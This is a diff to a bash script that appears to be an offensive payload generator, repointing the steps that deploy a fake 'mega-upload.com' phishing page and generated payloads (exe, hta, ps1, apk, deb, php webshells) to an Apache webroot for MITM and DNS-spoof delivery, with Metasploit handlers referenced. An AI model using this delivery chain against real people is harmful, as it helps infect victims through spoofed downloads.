@@ -78,7 +78,6 @@ InJEc16="$IPATH/templates/exec.jar" # jar script path
 # -------------------------------------------
 ChEk=`cat settings | egrep -m 1 "MSF_REBUILD" | cut -d '=' -f2` > /dev/null 2>&1
 MsFu=`cat settings | egrep -m 1 "MSF_UPDATE" | cut -d '=' -f2` > /dev/null 2>&1
-D3F=`cat settings | egrep -m 1 "APACHE_DEFAULT" | cut -d '=' -f2` > /dev/null 2>&1
 ApAcHe=`cat settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
 D0M4IN=`cat settings | egrep -m 1 "MEGAUPLOAD_DOMAIN" | cut -d '=' -f2` > /dev/null 2>&1
 DrIvC=`cat settings | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
@@ -446,8 +445,8 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m $D3F/$N4m
+        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m $ApAcHe/$N4m
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -477,8 +476,7 @@ echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/exec[bak].c $InJEc
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 sleep 2
@@ -659,8 +657,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m2 $D3F/$N4m2
+        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -695,10 +693,8 @@ rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $IPATH/templates/copy.c > /dev/null 2>&1
 rm $IPATH/templates/copy2.c > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
-rm $D3F/$N4m2 > /dev/null 2>&1
 rm $ApAcHe/$N4m2 > /dev/null 2>&1
 rm $ApAcHe/trigger.bat > /dev/null 2>&1
 sleep 2
@@ -819,8 +815,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m2 $D3F/$N4m2
+        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -851,10 +847,8 @@ mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
-rm $D3F/$N4m2 > /dev/null 2>&1
 rm $ApAcHe/$N4m2 > /dev/null 2>&1
 rm $ApAcHe/trigger.bat > /dev/null 2>&1
 clear
@@ -1213,8 +1207,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.exe $D3F/$N4m.exe
+        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -1249,8 +1243,7 @@ mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.exe > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.exe > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -1427,8 +1420,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.exe $D3F/$N4m.exe
+        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -1464,8 +1457,7 @@ rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/templates/final.c > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.exe > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.exe > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -1580,8 +1572,8 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.rb|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.rb $D3F/$N4m.rb
+        sed "s|NaM3|$N4m.rb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.rb $ApAcHe/$N4m.rb
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -1612,8 +1604,7 @@ rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.rb > /dev/null 2>&1
 rm $ApAcHe/trigger.bat > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.rb > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -1749,8 +1740,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m2 $D3F/$N4m2
+        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -1787,9 +1778,7 @@ rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
 rm $ApAcHe/$N4m2 > /dev/null 2>&1
 rm $ApAcHe/trigger.bat > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m > /dev/null 2>&1
-rm $D3F/$N4m2 > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 }
@@ -1957,8 +1946,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.bat $D3F/$N4m.bat
+        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -1996,8 +1985,7 @@ rm -r $H0m3/.psploit > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.bat > /dev/null 2>&1
 rm $IPATH/bin/sedding.raw > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.bat > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -2095,7 +2083,7 @@ sed "s|NaM3|$N4m.hta|g" index.html > copy.html
 mv copy.html $IPATH/output/index.html
 # replace INj3C by shellcode stored in var Sh33L in 'meu_hta-psh.hta' file
 sed "s|Inj3C|$Sh33L|g" exec.hta > $N4m.hta
-cp $IPATH/templates/phishing/missing_plugin.png $D3F/missing_plugin.png > /dev/null 2>&1
+cp $IPATH/templates/phishing/missing_plugin.png $ApAcHe/missing_plugin.png > /dev/null 2>&1
 mv $N4m.hta $IPATH/output/$N4m.hta > /dev/null 2>&1
 chown $user $IPATH/output/$N4m.hta > /dev/null 2>&1
 
@@ -2126,8 +2114,8 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.hta|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.hta $D3F/$N4m.hta
+        sed "s|NaM3|$N4m.hta|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.hta $ApAcHe/$N4m.hta
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -2161,9 +2149,8 @@ rm $IPATH/templates/hta_attack/chars.raw > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $IPATH/output/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.hta > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/missing_plugin.png > /dev/null 2>&1
-rm $D3F/$N4m.hta > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm $ApAcHe/missing_plugin.png > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -2285,8 +2272,8 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.ps1|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.ps1 $D3F/$N4m.ps1
+        sed "s|NaM3|$N4m.ps1|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.ps1 $ApAcHe/$N4m.ps1
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -2319,8 +2306,7 @@ rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.ps1 > /dev/null 2>&1
 rm $ApAcHe/trigger.bat > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.ps1 > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -2471,8 +2457,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.bat $D3F/$N4m.bat
+        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -2507,8 +2493,7 @@ mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.bat > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.bat > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -2589,8 +2574,8 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.vbs|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.vbs $D3F/$N4m.vbs
+        sed "s|NaM3|$N4m.vbs|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.vbs $ApAcHe/$N4m.vbs
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -2620,8 +2605,7 @@ mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.vbs > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 cd $IPATH/
 }
 
@@ -2780,8 +2764,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.vbs|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.vbs $D3F/$N4m.vbs
+        sed "s|NaM3|$N4m.vbs|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.vbs $ApAcHe/$N4m.vbs
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -2816,8 +2800,7 @@ mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.vbs > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -3005,8 +2988,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.pdf $D3F/$N4m.pdf
+        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -3140,8 +3123,8 @@ fi
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.pdf $D3F/$N4m.pdf
+        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -3188,8 +3171,7 @@ rm $IPATH/output/$N4m.exe > /dev/null 2>&1
 rm $IPATH/output/$N4m.py > /dev/null 2>&1
 rm $IPATH/output/template.c > /dev/null 2>&1
 rm $ApAcHe/$N4m.pdf > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.pdf > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -3281,8 +3263,8 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.php $D3F/$N4m.php
+        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.php $ApAcHe/$N4m.php
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -3312,8 +3294,7 @@ mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.php > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.php > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 clear
 cd $IPATH/
 
@@ -3415,8 +3396,8 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.php $D3F/$N4m.php
+        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.php $ApAcHe/$N4m.php
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -3536,8 +3517,8 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.php $D3F/$N4m.php
+        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.php $ApAcHe/$N4m.php
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -3568,8 +3549,7 @@ rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/trigger.sh > /dev/null 2>&1
 rm $ApAcHe/$N4m.php > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.php > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 clear
 cd $IPATH/
 fi
@@ -3691,8 +3671,8 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m $D3F/$N4m
+        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m $ApAcHe/$N4m
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -3723,8 +3703,7 @@ mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -3804,8 +3783,8 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.jar $D3F/$N4m.jar
+        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.jar $ApAcHe/$N4m.jar
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -3834,8 +3813,7 @@ sleep 2
 mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.jar > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.jar > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 clear
 cd $IPATH/
 
@@ -3910,8 +3888,8 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.jar $D3F/$N4m.jar
+        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.jar $ApAcHe/$N4m.jar
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -3938,8 +3916,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 echo "[☠] Cleanning temp generated files..."
 sleep 2
 rm $ApAcHe/$N4m.jar > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.jar > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 mv $IPATH/templates/exec[bak].jar $InJEc16 > /dev/null 2>&1
 mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
@@ -4042,8 +4019,8 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m $D3F/$N4m
+        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m $ApAcHe/$N4m
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -4072,8 +4049,7 @@ mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/web_delivery[bak].py $IPATH/templates/web_delivery.py > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -4142,8 +4118,8 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$filename.bat|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$filename.bat $D3F/$filename.bat
+        sed "s|NaM3|$filename.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$filename.bat $ApAcHe/$filename.bat
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -4172,8 +4148,7 @@ mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$filename.bat > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$filename.bat > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -4274,8 +4249,8 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPAT
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.deb|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.deb $D3F/$N4m.deb
+        sed "s|NaM3|$N4m.deb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.deb $ApAcHe/$N4m.deb
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -4304,8 +4279,7 @@ sleep 2
 echo "[☠] Cleanning temp generated files..."
 sleep 2
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.deb > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.deb > /dev/null 2>&1
 clear
@@ -4377,8 +4351,8 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.apk|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.apk $D3F/$N4m.apk
+        sed "s|NaM3|$N4m.apk|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.apk $ApAcHe/$N4m.apk
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -4407,8 +4381,7 @@ sleep 2
 echo "[☠] Cleanning temp generated files..."
 sleep 2
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.apk > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.apk > /dev/null 2>&1
 clear
@@ -4509,8 +4482,8 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $D3F/index.html
-        cp $IPATH/output/$N4m.exe $D3F/$N4m.exe
+        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -4546,8 +4519,7 @@ echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.exe > /dev/null 2>&1
-rm $D3F/index.html > /dev/null 2>&1
-rm $D3F/$N4m.exe > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
